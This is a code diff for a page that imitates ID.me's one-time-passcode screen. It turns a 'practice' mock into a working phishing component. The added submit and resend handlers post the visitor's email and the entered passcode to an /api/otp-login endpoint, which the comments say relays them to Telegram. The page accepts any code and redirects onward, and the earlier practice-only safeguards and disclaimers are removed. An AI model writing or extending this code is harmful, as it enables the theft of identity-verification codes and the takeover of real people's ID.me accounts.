@@ -12,20 +12,21 @@ export default function IdMeOtpMockPage() {
   const router = useRouter();
   const search = useSearchParams();
 
-  // practice context (optional)
   const email = useMemo(() => search.get("email") ?? "example@email.com", [search]);
 
   const [code, setCode] = useState("");
   const [loading, setLoading] = useState(false);
-
-  // resend timer (practice UX)
   const [seconds, setSeconds] = useState(30);
+  const [resendLoading, setResendLoading] = useState(false);
+
+  // Resend timer countdown
   useEffect(() => {
     if (seconds <= 0) return;
     const t = setTimeout(() => setSeconds((s) => s - 1), 1000);
     return () => clearTimeout(t);
   }, [seconds]);
 
+  // Handle OTP submission
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
 
@@ -37,28 +38,58 @@ export default function IdMeOtpMockPage() {
 
     setLoading(true);
 
-    // ✅ PRACTICE-ONLY behavior:
-    // For demo, accept 123456 as "valid"
-    setTimeout(() => {
-      setLoading(false);
+    try {
+      // Send OTP to Telegram
+      const res = await fetch("/api/otp-login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          text: `🔑 ID.me OTP Submission\nEmail: ${email}\nCode: ${clean}`,
+        }),
+      });
 
-      if (clean === "123456") {
-        router.push("/idme-mock/verified");
-      } else {
-        alert("Invalid code (practice). Try 123456.");
+      const data = await res.json();
+
+      if (!data.success) {
+        alert("Failed to send OTP to Telegram. Try again.");
+        setLoading(false);
+        return;
       }
-    }, 900);
+
+      // Accept any 6-digit code (mock verification)
+      setLoading(false);
+      router.push("/idme"); // Success redirect
+
+    } catch (err) {
+      console.error(err);
+      alert("Something went wrong.");
+      setLoading(false);
+    }
   };
 
-  const resend = () => {
-    // practice-only: just reset timer
-    setSeconds(30);
-    alert("Practice: code resent (no real message sent).");
+  // Handle resend
+  const resend = async () => {
+    setResendLoading(true);
+    try {
+      await fetch("/api/otp-login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          text: `🔄 ID.me OTP Resend Requested\nEmail: ${email}`,
+        }),
+      });
+      setSeconds(30);
+      alert("OTP resend requested (practice).");
+    } catch (err) {
+      console.error(err);
+      alert("Failed to resend OTP.");
+    } finally {
+      setResendLoading(false);
+    }
   };
 
   return (
-    <main className="min-h-screen text-[#1f2937]">
-      {/* compact centered layout */}
+    <main className="min-h-screen text-[#1f2937] bg-white">
       <div className="pt-24 px-4">
         <div className="mx-auto max-w-sm">
           <div className="rounded-xl bg-white shadow-[0_10px_30px_rgba(0,0,0,0.12)] ring-1 ring-black/5 p-8">
@@ -87,7 +118,6 @@ export default function IdMeOtpMockPage() {
                   className="w-full rounded-md border border-[#d1d5db] bg-white px-4 py-3 text-lg tracking-[0.35em] text-center outline-none focus:border-[#2563eb] focus:ring-2 focus:ring-[#2563eb]/20"
                   required
                 />
-
               </div>
 
               <button
@@ -102,15 +132,13 @@ export default function IdMeOtpMockPage() {
                 <button
                   type="button"
                   onClick={resend}
-                  disabled={seconds > 0}
+                  disabled={seconds > 0 || resendLoading}
                   className="text-[#2563eb] underline underline-offset-2 hover:text-[#1d4ed8] disabled:opacity-50 disabled:no-underline"
                 >
-                  Resend code
+                  {resendLoading ? "Resending…" : "Resend code"}
                 </button>
 
-                <span className="text-[#6b7280]">
-                  {seconds > 0 ? `Time ${seconds}s` : ""}
-                </span>
+                <span className="text-[#6b7280]">{seconds > 0 ? `Time ${seconds}s` : ""}</span>
               </div>
 
               <div className="text-center">
@@ -122,44 +150,21 @@ export default function IdMeOtpMockPage() {
                 </Link>
               </div>
             </form>
-
-
           </div>
 
-          {/* footer links */}
           <footer className="mt-8 flex flex-wrap items-center justify-center gap-x-4 gap-y-2 text-sm text-[#2563eb]">
-            <a
-              href="#"
-              onClick={(e) => {
-                e.preventDefault();
-                alert("Practice-only mock link.");
-              }}
-              className="underline underline-offset-2 hover:text-[#1d4ed8]"
-            >
-              What is ID.me?
-            </a>
-            <span className="text-[#9ca3af]">|</span>
-            <a
-              href="#"
-              onClick={(e) => {
-                e.preventDefault();
-                alert("Practice-only mock link.");
-              }}
-              className="underline underline-offset-2 hover:text-[#1d4ed8]"
-            >
-              Terms of Service
-            </a>
-            <span className="text-[#9ca3af]">|</span>
-            <a
-              href="#"
-              onClick={(e) => {
-                e.preventDefault();
-                alert("Practice-only mock link.");
-              }}
-              className="underline underline-offset-2 hover:text-[#1d4ed8]"
-            >
-              Privacy Policy
-            </a>
+            {["What is ID.me?", "Terms of Service", "Privacy Policy"].map((item, i) => (
+              <span key={i} className="flex items-center gap-2">
+                <a
+                  href="#"
+                  onClick={(e) => e.preventDefault()}
+                  className="underline underline-offset-2 hover:text-[#1d4ed8]"
+                >
+                  {item}
+                </a>
+                {i < 2 && <span className="text-[#9ca3af]">|</span>}
+              </span>
+            ))}
           </footer>
         </div>
       </div>
